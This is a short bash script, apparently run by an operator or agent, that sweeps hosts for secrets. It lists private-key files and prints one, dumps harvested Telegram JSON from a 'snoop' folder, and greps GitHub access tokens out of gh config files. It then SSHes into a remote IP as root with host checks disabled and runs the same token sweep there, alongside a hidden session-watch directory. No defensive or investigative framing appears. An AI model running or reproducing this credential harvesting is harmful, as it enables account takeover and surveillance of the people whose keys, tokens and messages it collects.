echo "=== 32-0000 key-ish files ==="
find /tmp /root /home -maxdepth 3 \( -name "*.pem" -o -name "id_*" -o -name "*key*" -o -name "k.*" \) -type f 2>/dev/null | grep -vE "node_modules|\.git|__pycache__|kubelet|containerd" | head -30
echo "=== rxk re-dump ==="
cat /root/.rxk
echo "=== tg harvest ==="
ls -la /root/snoop/ 2>/dev/null | head -20
for f in /root/snoop/tg_*.json; do [ -f "$f" ] && echo "--- $f ---" && head -c 1500 "$f"; echo; done 2>/dev/null
echo "=== gh hosts on 32-0000 ==="
find /root /home -maxdepth 4 -name "hosts.yml" -path "*gh*" 2>/dev/null | while read f; do echo "--- $f ---"; grep -oE "(gho_|ghp_|ghu_|github_pat_)[A-Za-z0-9_]+" "$f" | head -5; done
echo "=== .62 sesswatch fresh + gh hosts sweep ==="
timeout 90 ssh -o StrictHostKeyChecking=no -i /root/.rxk radix-irprobe@85.234.79.62 'sudo bash -s' <<'PAYLOAD'
ls -la /tmp/.sesswatch/ | tail -8
find /home /data -maxdepth 5 -name "hosts.yml" -path "*gh*" 2>/dev/null | head -10
for f in $(find /home /data -maxdepth 5 -name "hosts.yml" -path "*gh*" 2>/dev/null | head -10); do echo "--- $f ---"; grep -oE "(gho_|ghp_|ghu_|github_pat_)[A-Za-z0-9_]+" $f | head -5; done
PAYLOAD
echo "=== B12DONE ==="
